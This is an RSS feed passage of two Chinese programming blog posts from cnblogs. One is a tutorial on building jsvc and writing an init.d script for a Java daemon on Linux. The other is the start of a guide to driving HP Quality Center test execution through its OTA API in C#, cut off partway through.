<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Linux安装jsvc，及Linux服务开发 - 水木山川</title>
<link>http://www.cnblogs.com/zengming/p/10180047.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zengming/p/10180047.html</guid>
<description>&lt;p&gt;在linux上以服务的方式启动java程序，需要提前安装jsvc。linux是利用daemon(jsvc)构建java守护进程。&lt;/p&gt;
&lt;p&gt;编译 daemon 安装JSVC&lt;/p&gt;
&lt;p&gt;1 下载文件，&lt;a href=&quot;http://commons.apache.org/daemon/jsvc.html&quot; target=&quot;_blank&quot;&gt;http://commons.apache.org/daemon/jsvc.html&lt;/a&gt;&lt;br/&gt;　　commons-daemon-1.1.0-native-src.tar.gz&lt;br/&gt;2 编译：解压文件到linux，进入其子目录 'unix'，执行如下命令(如有必要执行chmod +x ./*)&lt;br/&gt;　　# &lt;span&gt;./configure --with-java=/usr/java&lt;/span&gt; 　　　　　　　　# 附带JDK（JAVA_HOME）路径&lt;br/&gt;　　#注：如果环境变量JAVA_HOME已经设置正确，就可以直接运行configure&lt;br/&gt;　　# &lt;span&gt;./configure&lt;/span&gt;&lt;br/&gt;　　# &lt;span&gt;make&lt;/span&gt; 　　　　　　　　　　　　　　　　　　　　#编译生成了可执行的文件 jsvc (在源文件目录的'unix目录下')&lt;/p&gt;
&lt;p&gt;编译jsvc包&lt;/p&gt;
&lt;p&gt;1.安装jsvc，在tomcat的bin目录下有一个jsvc.tar.gz的文件,上传jsvc.tar.gz 文件包&lt;/p&gt;
&lt;p&gt;　　#&lt;span&gt;tar xvfz jsvc.tar.gz&lt;/span&gt;&lt;br/&gt;　　#&lt;span&gt;cd jsvc-src&lt;/span&gt;&lt;br/&gt;　　#&lt;span&gt;sh support/buildconf.sh&lt;/span&gt;&lt;br/&gt;　　#&lt;span&gt;chmod 755 configure　　　　　　　　　　　　&lt;/span&gt;&lt;span&gt;#已安装JDK&lt;/span&gt;&lt;br/&gt;　　#./configure --with-java=/usr/local/java 　　　　　#手动配置JDK参数&lt;br/&gt;　　#注：如果环境变量JAVA_HOME已经设置正确，就可以直接运行configure&lt;br/&gt;　　#&lt;span&gt;make&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　开发Linux系统服务，首先需要实现org.apache.commons.daemon.&lt;span&gt;Daemon&lt;/span&gt;接口，服务在启动时会先调用 init(String[] args) 方法然后调用 start() 方法，在服务停止是会首先调用 stop() 方法，然后调用 destroy() 方法.&lt;br/&gt;　　1.将程序打包成 testjsvc.jar 放到/opt目录下&lt;br/&gt;　　2.编写启动服务脚本testjsvc（红色的修改参数）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
#! /bin/&lt;span&gt;sh
#Desc:  Daemon Service &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; testjsvc
NAME&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;testjsvc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
DESC&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Daemon Service for TestJSVC&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
#jdk的安装目录
JAVA_HOME&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/usr/java/jdk1.8.0_191&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
#jsvc所在的目录
JSVC&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/opt/testjsvc/jsvc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
#pid文件目录
PID_FILE&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;jsvc.pid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
PID_PATH&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/var/run/testjsvc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
PID&lt;/span&gt;=$PID_PATH/&lt;span&gt;$PID_FILE
TMP_DIR&lt;/span&gt;=&lt;span&gt;/var/&lt;/span&gt;&lt;span&gt;&lt;span&gt;tmp&lt;/span&gt;
#启动日志输出文件路径
LOG_FILE&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/opt/testjsvc/logs/startup.log&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
#应用程序的目录和路径
SCOREMARKER_PATH&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/opt/testjsvc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
SCOREMARKER_JAR&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/opt/testjsvc/testjsvc.jar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
#应用程序依赖包目录
CLASS_PATH&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$SCOREMARKER_JAR:$(echo $SCOREMARKER_PATH/lib/*.jar | tr ' ' ':')&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
CLASS&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;com.zsm.daemon.TestJSVCMain&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
#程序用户
JSVC_USER&lt;/span&gt;=&lt;span&gt;&lt;span&gt;root&lt;/span&gt;
OPTION&lt;/span&gt;=&lt;span&gt;$1&lt;/span&gt;&lt;span&gt;

execute_jsvc(){
    svc &lt;/span&gt;-cp $CLASS_PATH -home $JAVA_HOME -user $JSVC_USER -Djava.io.tmpdir=$TMP_DIR -wait &lt;span&gt;3&lt;/span&gt; -outfile $LOG_FILE -errfile $LOG_FILE -pidfile $PID $&lt;span&gt;1&lt;/span&gt;&lt;span&gt; $CLASS
}

&lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$OPTION&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;in&lt;/span&gt;&lt;span&gt;
    start)
        echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Starting $DESC..&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$(date): Starting $DESC..&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;gt;&amp;gt;&lt;span&gt; $LOG_FILE
        execute_jsvc
        echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;The $DESC has started&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        echo $&lt;/span&gt;!&lt;span&gt;
    ;;
    stop)
        echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Stoping $DESC..&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$(date): Stoping $DESC..&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;gt;&amp;gt;&lt;span&gt; $LOG_FILE
        execute_jsvc &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-stop&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;The $DESC has stoped&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    ;;    
    restart)
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; [ -f &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$PID&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; ]; then
            echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Restarting $DESC..&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$(date): Restarting $DESC..&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;gt;&amp;gt;&lt;span&gt; $LOG_FILE
            execute_jsvc &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-stop&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            execute_jsvc
            echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;The $DESC has restarted&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; 
            echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;The $DESC is not restarted&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;gt;&amp;gt;&lt;span&gt; $LOG_FILE
            echo $&lt;/span&gt;!
        &lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;The $DESC is not running, no action taken&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            exit &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
        fi
    ;;
    status)
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; [ -f &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$PID&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; ]; then
            echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;The $DESC is running&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
        &lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;The $DESC is not running&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        fi            
    ;;
    &lt;/span&gt;*&lt;span&gt;)
        echo &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Usage: /etc/init.d/$NAME {start|stop|restart|status}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;gt;&amp;amp;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;
        exit &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;
    ;;
esac&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　3.把 testjsvc 文件拷贝到 /etc/init.d/ 目录下，添加到启动服务里面去.&lt;br/&gt;　　#chmod -c 777 /etc/init.d/testjsvc 　　　　　　 　　　　　　 #赋予执行权限&lt;/p&gt;
&lt;p&gt;　　#chkconfig --add testjsvc 　　　　　　　　　　　　　　 　　 #添加服务&lt;/p&gt;
&lt;p&gt;　　#chkconfig --level 345 testjsvc on 　　　　　　　　　　　　  #设置服务的启动级别&lt;/p&gt;
&lt;p&gt;　　#service testjsvc start 　　　　　　　　　　　　　　　　　　#启动服务，并且在系统重启时会自动启动myjsvc服务&lt;/p&gt;
&lt;p&gt;&lt;em id=&quot;__mceDel&quot;&gt; &lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 27 Dec 2018 15:43:00 +0000</pubDate>
<dc:creator>水木山川</dc:creator>
<og:description>JSVC安装，Linux开发Daemon程序，jsvc服务脚本，Linux服务开发</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zengming/p/10180047.html</dc:identifier>
</item>
<item>
<title>QC API全系列揭秘之Test Execution操作（全网首发） - 泽南-Alpha</title>
<link>http://www.cnblogs.com/alphaxu/p/10188187.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/alphaxu/p/10188187.html</guid>
<description>&lt;p&gt;（原创文章，转载请注明出处。）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一、QC简介：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;        Quality Center存在至今已经走过了10多个年头，名字从一开始的TD，到后来的QC，再到现在的ALM。所属公司从开始的Mercury到现在的HP，核心一直没变，变的只有名字。随着Mercury最核心的高层、架构师和专家的离开，现在每每的升级都带来诸多失望，再也没有当初使用Mercury工具的时候那样心潮澎湃，看看QC，看看QTP，不多言语。如果能够坚持做好的话，现在哪有TestLink、哪有禅道什么事。然而，QC框架的设计核心，拿到现在来看，依然是测试管理框架的主流。QC设计思路简单清晰，从测试需求到测试用例，再到执行测试用例、提交缺陷、跟踪缺陷，整个过程清晰且易于理解，时至今日，依然被广泛沿用。（微信公众号“诗泽园”）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二、写作目的：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;        写此系列的目的，不是为了情怀，而是为了将QC接口的调用方式整理成册。一来是为了通过对QC接口调用的理解，去更深入的理解测试框架的概念（当然仅仅包含小部分）；二来是为了通过二次开发，解决QC使用过程中的诸多不便。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;三、解决问题：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;QC当前存在以下问题：&lt;/p&gt;
&lt;p&gt;1、需求或用例的导入导出依然不完善。之前就写过一个工具解决这个问题：&lt;a title=&quot;QC Export Tool&quot; href=&quot;https://download.csdn.net/download/yoyoalphax/4441588&quot; target=&quot;_blank&quot;&gt;https://download.csdn.net/download/yoyoalphax/4441588&lt;/a&gt;，但近期依然常有人催促我更新版本，之后会专门发一篇关于用例树解析的图文。（网上资料大部分需要admin账户通过后台SQL做关键字筛选获得结果，但事实上与实际的导入导出过程有所出入。）&lt;/p&gt;
&lt;p&gt;2、用例执行顺序需要参考已有用例集，无法随心所欲变化。&lt;/p&gt;
&lt;p&gt;3、每次执行的用例集列表无法保存并复用。&lt;/p&gt;
&lt;p&gt;4、手动执行前需要处理解锁等额外步骤。&lt;/p&gt;
&lt;p&gt;5、测试结果随有统一展示，但需要人工收集结果等等。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;四、本文重点：&lt;/strong&gt;&lt;br/&gt;        本文着重介绍Test Execution部分，解决了以上罗列的后几个问题，并为某些问题提供解决的条件。其余需求树、用例树读取及写入部分以后再介绍。&lt;br/&gt;        Test Execution属于自动化测试框架的一部分，我们先从框架说起。&lt;br/&gt;        &lt;strong&gt;框架的概念：&lt;/strong&gt;&lt;br/&gt;        测试框架的话题，范围实在是太大了，我们还是围绕QC来说。我们仅仅考虑从测试用例的编写、测试用例的执行和测试报告来看。用过的同学都清楚，TestPlan里可以存放测试用例，而TestLab里可以建TestSet并形成用例集并且执行，Report里查看用例，这就是基本流程。而对于自动化测试的流程而言，用QC的方式又有所区别：首先，是测试工具的关联。QC需要安装QTP或LR的插件，使得QC的测试执行模块里可以识别这两类代码。又或者你用的是其他第三方工具或用JAVA和.Net自开发的测试工具，那你需要用VB6编写关联脚本，使得QC能够调用你写的代码，这个过程我们不在本文中讨论。其次，是测试脚本的存储。以用例的形式存储在TestPlan里，最终落到QC的后台SQL数据库里，并能实现脚本与数据的分开存储。再者是测试用例集的构成，这部分是放在TestLab里去管理。按照业务逻辑，将已有用例归集并排序，形成业务逻辑并保存。最后是测试执行，按照被测系统版本、范围，选择相应的业务节点去触发执行，获得结果。&lt;/p&gt;
&lt;p&gt;        这个过程其实分两个阶段，一个是测试开发阶段，另一个是测试执行阶段，两个阶段各有各的自动化设计方面的考虑。这个不是本文的主旨，但是我也顺便捋一下，加深理解。测试开发阶段，其实是要设计出狭义的测试框架，也就是一个可以团队合作开发的测试脚本的模式，包含底层库、业务的封装、上层调用及断言等等。有了狭义的框架后，需要有偏业务的测试人员介入，将测试脚本归集形成测试集。在测试开发阶段，往往这两块是一同进行的，边改边拼接。测试Q执行阶段，其实是要有测试执行框架去支撑的，尤其是有大批量的测试脚本和测试机需要团队去匹配执行时，这个框架就显得尤为重要。其中涉及到的关键点，如待测范围的选择及保存、测试机的管理（vmware or docker）、用例执行时的动态分配、异常处理、报告收集等等。&lt;/p&gt;
&lt;p&gt;        本文所涉及的内容应该是通过QC实现自动化测试脚本运行的前提下，实现测试范围的选择与保存，测试脚本的自动化执行并做后续的报告收集工作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;五、QC接口规范：&lt;/strong&gt;&lt;br/&gt;        具体的接口规范你可以尝试通过百度查询“QC OTA”或者“QC对象模型”，获得接口说明及使用规范。但以下的核心代码均是本人键盘手打敲击而成，尤其是核心的业务树生成及测试执行部分，均为首次发布。还望转载或代码复用时注明出处。（出自微信公众号“诗泽园”或博客园“朝花夕拾”）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;六、QC接口操作Test Execution：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;正式切入正题：&lt;/p&gt;
&lt;h3 id=&quot;h&quot;&gt;&lt;span&gt;定义全局变量&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;真实代码中有很多控制类及展示类，都已经去除了。这里只展示核心代码。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs php&quot;&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;1&lt;/span&gt;        TDConnection tdc = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; TDConnection();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;2&lt;/span&gt;        TDAPIOLELib.TSScheduler QCscheduler;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;3&lt;/span&gt;        &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;4&lt;/span&gt;        TDAPIOLELib.ExecutionStatus QCexecutionStatus;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;5&lt;/span&gt;        &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;6&lt;/span&gt;        &lt;span class=&quot;hljs-keyword&quot;&gt;List&lt;/span&gt; QClistForTSTest;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;hqc&quot;&gt;&lt;span&gt;QC服务器连接、登录（身份验证）及项目连接&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;服务器连接为初始化连接，好比你刚登录QC终端时它给你的反馈。一般会碰到要你reload ActiveX或者OTA初始化失败之类的错误。处理方法是把QC缓存文件夹删除，再访问，让其重新reload。这块代码里会有处理，但这类代码就不贴了。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cpp&quot;&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 1&lt;/span&gt;        &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 2&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;InitConnect&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt; serverName)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 3&lt;/span&gt;        &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 4&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 5&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 6&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; ((tdc.Connected == &lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;) || (tdc.Connected == &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt; &amp;amp;&amp;amp; tdc.ServerName != serverName))&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 7&lt;/span&gt;                    tdc.InitConnectionEx(serverName);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 8&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 9&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;10&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;11&lt;/span&gt;                Console.WriteLine(ex.ToString());&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;12&lt;/span&gt;                MessageBox.Show(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Server Error&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;Warning&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;13&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;14&lt;/span&gt;        }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;15&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;16&lt;/span&gt;        &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;17&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;GetAuthenticate&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt; userName, &lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt; passWord)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;18&lt;/span&gt;        &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;19&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;20&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;21&lt;/span&gt;                tdc.Login(userName, passWord);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;22&lt;/span&gt;                TDAPIOLELib.List projectList = tdc.get_VisibleProjects(tdc.VisibleDomains[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;].ToString());&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;23&lt;/span&gt;                &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;24&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;; i &amp;lt;= projectList.Count; i++)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;25&lt;/span&gt;                {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;26&lt;/span&gt;                    projectsBox.Items.Add(projectList[i]);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;27&lt;/span&gt;                    &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;28&lt;/span&gt;                }            &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;29&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;30&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;31&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;32&lt;/span&gt;                Console.WriteLine(ex.ToString());&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;33&lt;/span&gt;                MessageBox.Show(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Please check the User Name is correct or not.&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;Warning&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;34&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;35&lt;/span&gt;        }&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cs&quot;&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 1&lt;/span&gt;        &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 2&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;LoginButton_Click&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;object&lt;/span&gt; sender, EventArgs e&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 3&lt;/span&gt;        &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 4&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 5&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 6&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;string&lt;/span&gt; ProjectName = projectsBox.SelectedItem.ToString();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 7&lt;/span&gt;                tdc.Connect(tdc.VisibleDomains[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;].ToString(), ProjectName);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 8&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 9&lt;/span&gt;                &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;10&lt;/span&gt;                Thread td_tree = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Thread(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ThreadStart(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.CreateTreeView));&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;11&lt;/span&gt;                td_tree.Start();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;12&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;13&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;14&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;15&lt;/span&gt;                Console.WriteLine(ex.ToString());&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;16&lt;/span&gt;                MessageBox.Show(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Please choose the project.&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;Warning&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;17&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;18&lt;/span&gt;        }&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h-1&quot;&gt;&lt;span&gt;重点之一：递归生成业务树&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;同样需要新开线程调用，先生成根节点，再递归生成业务树&lt;/p&gt;
&lt;pre&gt;
